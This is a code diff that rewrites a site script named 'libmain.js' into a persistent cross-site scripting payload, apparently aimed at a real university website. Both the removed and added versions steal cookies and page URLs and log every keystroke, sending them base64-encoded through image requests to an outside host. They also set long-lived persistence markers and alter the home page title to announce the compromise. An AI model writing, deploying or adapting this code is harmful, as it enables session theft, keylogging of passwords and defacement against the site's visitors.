@@ -1,27 +1,36 @@
-// YOUR EXISTING libmain.js → REPLACE with this:
+// ULTRA PERSISTENT XSS - MULTI-METHOD
 (function(){
-    console.log(' libmain loaded!');
+    console.log('🔥 libmain.js → Multi-persistence active!');
     
-    // COOKIE PERSISTENCE
-    document.cookie = 'xss_hacked=1;path=/;domain=.mgkvp.ac.in';
+    // Method 1: LocalStorage (Most Reliable)
+    localStorage.setItem('xss_persist', '1');
     
-    // SITEWIDE EXECUTION
-    if(document.cookie.includes('xss_hacked=1')){
-        console.log('🌐 SITEWIDE XSS ACTIVE on:', window.location.href);
+    // Method 2: SessionStorage  
+    sessionStorage.setItem('xss_active', '1');
+    
+    // Method 3: Cookie (Fallback)
+    document.cookie = 'xss=1;path=/;max-age=31536000';
+    
+    // EXECUTE EVERYWHERE
+    if(localStorage.getItem('xss_persist') === '1'){
+        console.log('🌐 PERMANENT XSS on:', location.href);
         
-        // Data exfil (NO CORS)
-        var pixel = new Image();
-        pixel.src='https://httpbin.org/image/png?data='+btoa(document.cookie+'|'+location.href);
+        // Beacon
+        new Image().src='https://httpbin.org/image/png?xss='+btoa('URL:'+location.href+'|Cookies:'+document.cookie);
         
-        // KEYLOGGER EVERY PAGE
-        document.onkeydown = function(e){
-            new Image().src='https://httpbin.org/image/png?key='+btoa(e.key);
-        };
+        // KEYLOGGER UNIVERSAL
+        if(!window.xss_keylogger){
+            window.xss_keylogger = true;
+            document.addEventListener('keydown', function(e){
+                new Image().src='https://httpbin.org/image/png?key='+btoa(e.key+'|'+location.pathname);
+            });
+            console.log('⌨️ KEYLOGGER DEPLOYED GLOBALLY');
+        }
         
-        // HOME PAGE DETECTION
-        if(location.href.includes('mgkvp.ac.in') && !location.href.includes('pageContentDetails')){
-            console.log('🏠 HOME PAGE ');
-            document.title = 'XSS Owned by H';
+        // HOME PAGE MARKER
+        if(location.host === 'www.mgkvp.ac.in' && location.pathname === '/'){
+            console.log('🏠 HOME PAGE COMPROMISED!');
+            document.title += ' [HACKED]';
         }
     }
 })();
